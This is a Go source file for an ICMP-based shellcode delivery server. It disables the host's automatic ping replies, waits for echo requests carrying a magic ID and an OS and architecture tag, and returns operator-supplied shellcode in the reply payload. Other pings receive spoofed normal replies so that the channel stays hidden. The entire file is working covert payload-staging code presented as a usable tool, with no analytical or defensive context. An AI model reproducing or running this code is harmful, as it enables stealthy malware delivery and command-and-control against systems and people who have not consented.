package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func main() {

	var osType string
	var arch string
	var sc string

	flag.StringVar(&osType, "os", "", "Specify the OS type: win or lin")
	flag.StringVar(&arch, "a", "", "Specify the architecture: 32 or 64")
	flag.StringVar(&sc, "sc", "", "Specify the shellcode")

	flag.Parse()

	if (osType != "win" && osType != "lin") || (arch != "32" && arch != "64") || sc == "" {
		flag.Usage()
		os.Exit(1)
	}

	// check for root privileges
	if os.Geteuid() != 0 {
		fmt.Println("Please start this Program as root.")
		os.Exit(1)
	}

	fmt.Println("Disabling Systems auto ping reply...")
	// disable auto Ping reply in Linux-System
	noAutoPing := exec.Command("sysctl", "-w", "net.ipv4.icmp_echo_ignore_all=1")
	err := noAutoPing.Run()
	if err != nil {
		log.Fatalf("Could not run command: %v", err)
	}

	// create a channel to receive signals
	sigchan := make(chan os.Signal, 1)
	signal.Notify(sigchan, os.Interrupt, syscall.SIGTERM)

	// decode shellcode for the ICMP packet
	shellcode, err := hex.DecodeString(sc)
	if err != nil {
		log.Printf("Error decoding shellcode: %v", err)
	}

	// listen for icmp packets
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatal(err)
	}

	rb := make([]byte, 2000)

	// Erstelle neue Farbobjekte für Grün, Gelb und Rot
	green := color.New(color.FgGreen).SprintFunc()
	yellow := color.New(color.FgYellow).SprintFunc()
	red := color.New(color.FgRed).SprintFunc()

	fmt.Println("Listener started...")

	go func() {
		// wait for the signal
		<-sigchan
		fmt.Println("")
		fmt.Println("Enabling Systems auto ping reply...")
		noAutoPing := exec.Command("sysctl", "-w", "net.ipv4.icmp_echo_ignore_all=0")
		err := noAutoPing.Run()
		if err != nil {
			log.Fatalf("Could not run command: %v", err)
		}
		fmt.Println("Goodbye!")
		// close connection to terminate the loop
		conn.Close()
	}()

	for {

		n, peer, err := conn.ReadFrom(rb)
		if err != nil {
			log.Fatal(err)
		}

		rm, err := icmp.ParseMessage(1, rb[:n])
		if err != nil {
			log.Fatal(err)
		}

		// validate ID to make sure that the packet comes from our application
		if rm.Type == ipv4.ICMPTypeEcho && rm.Body.(*icmp.Echo).ID == 0x000f { // validate ID

			if len(rm.Body.(*icmp.Echo).Data) == 5 && // validate Data length to avoid index errors
				string(rm.Body.(*icmp.Echo).Data[:3]) == osType && // validate OS for shellcode compatibility
				string(rm.Body.(*icmp.Echo).Data[3:5]) == arch { // validate arch for shellcode compatibility

				reply := &icmp.Message{
					Type: ipv4.ICMPTypeEchoReply,
					Code: 0,
					Body: &icmp.Echo{
						ID:   rm.Body.(*icmp.Echo).ID,
						Seq:  rm.Body.(*icmp.Echo).Seq,
						Data: []byte(shellcode),
					},
				}

				wb, err := reply.Marshal(nil)
				if err != nil {
					log.Fatal(err)
				}

				if _, err := conn.WriteTo(wb, peer); err != nil {
					log.Fatal(err)
				}

				fmt.Println(green("ping from ") +
					green(peer.(*net.IPAddr).IP.String()) +
					green(":   ") +
					green("OS: ") +
					green(string(rm.Body.(*icmp.Echo).Data[:3])) +
					green("   arch: ") +
					green(string(rm.Body.(*icmp.Echo).Data[3:5])) +
					green("   matching shellcode sent!"))

			} else if len(rm.Body.(*icmp.Echo).Data) == 5 && // if OS or arch of our client app doesn't match send normal reply (means nothing to execute)
				string(rm.Body.(*icmp.Echo).Data[:3]) != osType ||
				string(rm.Body.(*icmp.Echo).Data[3:5]) != arch {

				reply := &icmp.Message{
					Type: ipv4.ICMPTypeEchoReply,
					Code: 0,
					Body: &icmp.Echo{
						ID:   rm.Body.(*icmp.Echo).ID,
						Seq:  rm.Body.(*icmp.Echo).Seq,
						Data: rm.Body.(*icmp.Echo).Data,
					},
				}

				wb, err := reply.Marshal(nil)
				if err != nil {
					log.Fatal(err)
				}

				if _, err := conn.WriteTo(wb, peer); err != nil {
					log.Fatal(err)
				}

				fmt.Println(yellow("ping from ") +
					yellow(peer.(*net.IPAddr).IP.String()) +
					yellow(":   ") +
					yellow("OS: ") +
					yellow(string(rm.Body.(*icmp.Echo).Data[:3])) +
					yellow("   arch: ") +
					yellow(string(rm.Body.(*icmp.Echo).Data[3:5])) +
					yellow("   no matching shellcode to sent!"))

			}

		} else if rm.Type == ipv4.ICMPTypeEcho && rm.Body.(*icmp.Echo).ID != 0x000f { // spoof normal reply if the packet doesn't come from our app

			reply := &icmp.Message{
				Type: ipv4.ICMPTypeEchoReply,
				Code: 0,
				Body: &icmp.Echo{
					ID:   rm.Body.(*icmp.Echo).ID,
					Seq:  rm.Body.(*icmp.Echo).Seq,
					Data: rm.Body.(*icmp.Echo).Data,
				},
			}

			wb, err := reply.Marshal(nil)
			if err != nil {
				log.Fatal(err)
			}

			if _, err := conn.WriteTo(wb, peer); err != nil {
				log.Fatal(err)
			}

			fmt.Println(red("ping from ") +
				red(peer.(*net.IPAddr).IP.String()) +
				red(":   UNKNOWN   normal reply sent"))
		}
	}
}
